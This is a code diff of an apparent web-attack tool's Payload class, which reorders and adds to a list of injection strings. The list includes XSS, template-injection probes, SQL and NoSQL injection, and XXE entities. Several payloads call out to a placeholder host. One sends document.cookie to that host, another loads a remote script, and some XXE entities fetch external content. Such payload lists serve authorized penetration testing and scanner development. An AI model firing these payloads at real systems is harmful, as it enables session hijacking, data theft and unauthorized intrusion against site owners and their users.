@@ -115,17 +115,27 @@ class Payload:
     placeholder = "|placeholder|"
     payloads = [
         # basic
-        "<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'\"}}%\.",
-        # HTML
-        F"<meta http-equiv=\"refresh\" content=\"0; url={placeholder}\" />",
+        '<s> hi {*hi*} {{ 7*7 }} ${7*7} ${{<%[%\'\"}}%\.',
         # js
         "<img src=x onerror=alert(document.domain) />",
-        F"<script>console.log('Domain: ' + document.domain + 'Origin: ' + window.origin))</script>",
+        "<script>console.log('Domain: ' + document.domain + 'Origin: ' + window.origin))</script>",
         "<scr<script>ipt>alert(document.domain)</scr<script>ipt>",
-        "\"><script>alert(document.domain)</script>",
+        '"><script>alert(document.domain)</script>',
         "<svgonload=alert(document.domain)>",
         "java%0ascript:alert(document.domain)",
         "<object onbeforescriptexecute=confirm(document.domain)>",
+        # SQLi
+        "1 or 1=1 -- -",
+        "1' or 1=1",
+        "1\" or 1=1",
+        # NoSQL
+        '{"username": {"$ne": null}, "password": {"$ne": null}}',
+        "true, $where: '1 == 1'",
+        # XXE
+        "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example 'Doe'> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n",
+        # HTML
+        F"<meta http-equiv=\"refresh\" content=\"0; url={placeholder}\" />",
+        # JS Incl remote
         F"<img src=x onerror=this.src='{placeholder}?cookie='+document.cookie>",
         F"\"><script src={placeholder}></script>",
         F"<script>let d=new XMLHttpRequest();d.open(\"GET\",\"{placeholder}\");d.send()</script>",
@@ -145,15 +155,7 @@ class Payload:
         "${{"+placeholder+"}}",
         F"[[{placeholder}]]",
         F"<% {placeholder} %>",
-        # SQLi
-        "1 or 1=1 -- -",
-        "1' or 1=1",
-        "1\" or 1=1",
-        #NoSQL
-        '{"username": {"$ne": null}, "password": {"$ne": null}}',
-        "true, $where: '1 == 1'",
-        # XXE
-        "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example 'Doe'> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>\n",
+        # XXE incl remote
         F"<!ENTITY % xxe PUBLIC 'Random Text' '{placeholder}'>",
         F"<!ENTITY xxe PUBLIC 'Any TEXT' '{placeholder}'>",
         F"<?xml version=\"1.0\" ?>\n<!DOCTYPE root [\n<!ENTITY % ext SYSTEM \"{placeholder}\"> %ext;\n]>\n<r></r>",
